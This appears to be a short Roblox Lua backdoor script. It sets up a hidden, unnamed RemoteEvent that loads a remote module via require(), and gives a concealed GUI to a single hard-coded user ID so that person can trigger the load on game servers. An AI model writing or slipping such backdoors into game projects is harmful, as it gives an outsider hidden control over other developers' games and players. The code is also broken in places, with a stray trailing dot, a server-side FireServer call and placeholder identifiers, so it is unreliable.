local remote = Instance.new('RemoteEvent',game.ReplicatedStorage)
remote.Name = ""
remote.OnServerEvent:connect(function(a,s)
	if #s > 0 then
		require(Scource).load(a.Name)
	end
end)

game.Players.PlayerAdded:Connect(function(plr)
	if plr.UserId == UserIdHere then
		local c = script['']:Clone().
		c.Parent = plr.PlayerGui
		c.Frame[''].OnServerEvent:connect(function(a,s)
			remote:FireServer(a,s)
		end)
	end
end)
